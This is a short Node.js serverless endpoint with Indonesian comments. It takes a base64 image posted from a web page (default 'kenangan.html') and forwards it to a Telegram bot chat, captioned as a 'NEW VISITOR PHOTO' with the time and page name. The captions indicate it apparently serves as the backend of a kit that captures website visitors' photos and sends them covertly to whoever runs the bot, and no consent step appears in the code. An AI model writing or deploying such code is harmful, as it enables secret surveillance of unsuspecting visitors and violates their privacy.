// api/upload-photo.js
const fetch = require('node-fetch');
const FormData = require('form-data');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'method not allowed' });

  const body = req.body || {};
  const image = body.image; // dataURL
  const page = body.page || 'kenangan.html'; // klo mau kirim info halaman

  if (!image) return res.status(400).json({ ok: false, error: 'no image' });

  const m = image.match(/^data:(.+);base64,(.+)$/);
  if (!m) return res.status(400).json({ ok: false, error: 'invalid image format' });

  const mime = m[1];
  const b64 = m[2];
  const buffer = Buffer.from(b64, 'base64');

  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) return res.status(500).json({ ok: false, error: 'telegram not configured' });

  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append(
    'caption',
    `✨ *NEW VISITOR PHOTO* ✨
━━━━━━━━━━━━━━━━━━━
📸 Foto Pengunjung Website
🕒 ${waktu}
🌐 Halaman: ${page}
━━━━━━━━━━━━━━━━━━━`
  );
  form.append('parse_mode', 'Markdown');
  form.append('photo', buffer, { filename: 'capture.jpg', contentType: mime });

  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    const j = await r.json();
    if (!j.ok) {
      console.error('telegram error', j);
      return res.status(500).json({ ok: false, error: 'telegram api error', detail: j });
    }
    return res.status(200).json({ ok: true, data: j });
  } catch (err) {
    console.error('upload-photo error', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
};
